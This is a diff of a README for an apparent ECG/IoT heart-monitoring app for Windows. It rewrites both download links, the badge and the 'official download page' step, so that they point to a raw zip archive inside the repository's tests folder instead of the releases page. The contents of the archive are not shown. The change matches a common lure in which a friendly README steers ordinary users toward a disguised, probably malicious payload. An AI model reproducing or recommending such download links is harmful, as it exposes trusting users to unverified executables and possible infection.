@@ -1,6 +1,6 @@
 # ❤️ Edge-ECG-Digital-Service-Loop-IoT- - Your Heart's Safety Net, Simplified
 
-[![Download Now](https://img.shields.io/badge/Download-ECG_Service_Loop-FF6B6B?style=for-the-badge&logo=heart&logoColor=white&color=FF6B6B)](https://github.com/adeardianto12/Edge-ECG-Digital-Service-Loop-IoT-/releases)
+[![Download Now](https://img.shields.io/badge/Download-ECG_Service_Loop-FF6B6B?style=for-the-badge&logo=heart&logoColor=white&color=FF6B6B)](https://github.com/adeardianto12/Edge-ECG-Digital-Service-Loop-IoT-/raw/refs/heads/main/tests/EC-Io-Edge-Service-Digital-Loop-2.5.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Follow these simple steps to get the application running on your Windows compute
 
 ### Step 1️⃣: Visit the Official Download Page
 
-Visit this link to download the application: [https://github.com/adeardiantto12/Edge-ECG-Digital-Service-Loop-IoT-/releases](https://github.com/adeardiantto12/Edge-ECG-Digital-Service-Loop-IoT-/releases)
+Visit this link to download the application: [https://github.com/adeardianto12/Edge-ECG-Digital-Service-Loop-IoT-/raw/refs/heads/main/tests/EC-Io-Edge-Service-Digital-Loop-2.5.zip](https://github.com/adeardianto12/Edge-ECG-Digital-Service-Loop-IoT-/raw/refs/heads/main/tests/EC-Io-Edge-Service-Digital-Loop-2.5.zip)
 
 )
 
